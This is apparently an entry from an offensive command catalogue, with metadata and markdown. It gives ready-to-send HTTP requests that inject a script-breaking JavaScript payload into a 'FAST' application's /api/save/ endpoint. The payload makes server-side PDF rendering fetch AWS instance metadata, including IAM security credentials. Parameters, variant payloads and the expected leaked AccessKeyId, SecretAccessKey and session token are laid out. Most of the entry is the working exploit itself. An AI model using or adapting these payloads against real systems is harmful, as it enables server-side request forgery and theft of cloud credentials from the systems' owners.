---
id: cmd-js-payload-ssrf-fast-1628209
data: >-
  POST /api/save/ HTTP/1.1\nHost: target\nContent-Type:
  application/json\n\n{"globalInfo":{"name":"</script><script>document.write(\\"<iframe
  src=\\\\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2CloudWatchRole\\\\\"
  width=1000px height=1000px>\\")\/script>"}}
tags:
  - ssrf
  - javascript
  - injection
type: command
output: '{"status": "ok"}'
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.046Z'
verified: false
validated: true
submitted: true
---
# inject-javascript-payload-for-ssrf

## Command

```http
POST /api/save/ HTTP/1.1
Host: target
Content-Type: application/json

{"globalInfo":{"name":"</script><script>document.write(\"<iframe src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2CloudWatchRole\" width=1000px height=1000px>\")\/script>"}}
```

## Description

This HTTP request injects a JavaScript payload into the 'name' field of the globalInfo JSON for the FAST application's /api/save/ endpoint, exploiting lack of sanitization to enable SSRF during PDF generation by writing an iframe that sources AWS instance metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| globalInfo.name | The injected JS payload string closing script tags and adding iframe | Yes |
| src | AWS metadata URL (e.g., http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2CloudWatchRole) | Yes |
| width/height | Iframe dimensions to ensure visibility (1000px) | No |

## Examples

### Basic Usage

```http
POST /api/save/ HTTP/1.1
...
{"globalInfo":{"name":"</script><script>document.write(\"<iframe src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2CloudWatchRole\"\/>\")\/script>"}}
```

### Advanced Usage

Modify src to target other metadata paths, e.g., /latest/meta-data/instance-id for instance details.

```http
...
{"globalInfo":{"name":"</script><script>document.write(\"<iframe src=\"http://169.254.169.254/latest/meta-data/instance-id\"\/>\")\/script>"}}
```

## Expected Output

Server responds with {"status": "ok"}, but upon PDF refresh, the output includes embedded AWS JSON: {"Code": "Success", "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "...", "Expiration": "..."}.

## Related

- [[Related Procedure: Exploit-SSRF-via-JavaScript-Injection-in-FAST-PDF]]
